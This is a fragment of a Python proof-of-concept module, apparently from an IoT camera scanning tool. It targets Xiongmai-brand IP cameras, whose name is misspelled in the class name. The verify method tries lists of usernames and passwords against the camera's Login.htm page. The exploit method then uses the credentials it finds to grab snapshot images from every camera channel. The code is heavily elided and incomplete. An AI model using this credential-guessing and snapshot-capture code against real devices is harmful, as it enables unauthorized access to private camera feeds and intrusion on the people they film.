...
class XioingmaiWeakPassword(POCTemplate):
    ...
    def verify(self, ip, port=80):
        ...
        for user in self.config.users:
            for password in self.config.passwords:
                url = self._get_url(ip, port, '/Login.htm')
                data = {
                    'command': 'login',
                    'username': user,
                    'password': password
                ...
                try:
                    r = requests.get(url, headers=headers, data=data, verify=False, timeout=self.config.timeout, proxies=proxies)
    ...
    def exploit(self, results):
        ...
        for i in range(1, ch_num + 1):
            url = self._get_url(ip, port, f'/webcapture.jpg?command=snap&channel={i}&user={user}&password={password}')
